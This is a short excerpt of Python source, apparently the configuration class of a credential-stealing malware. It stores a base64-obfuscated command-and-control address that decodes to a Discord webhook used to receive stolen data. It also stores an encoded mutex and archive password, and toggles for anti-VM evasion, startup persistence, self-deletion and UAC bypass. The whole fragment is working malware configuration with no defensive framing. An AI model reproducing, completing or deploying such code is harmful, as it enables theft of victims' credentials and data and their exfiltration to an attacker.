...
class Settings:
    C2 = (0, base64.b64decode('aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTIzNTI2OTcxNjM3MzkzNDIxNS83cGUyby1LQ1VmSkYwc09Dbk91U1RqVVNJRDBZelBhYlhWc1JJdFJLbFNiYXVrWWg2enNNMmwxc3pIODlkam5iVmxHVA==').decode())
    Mutex = base64.b64decode('YzlGcVZBSzZRNnZmM1drMA==').decode()
    PingMe = bool('')
    Vmprotect = bool('true')
    Startup = bool('')
    Melt = bool('')
    UacBypass = bool('')
    ArchivePassword = base64.b64decode('MjAx').decode()
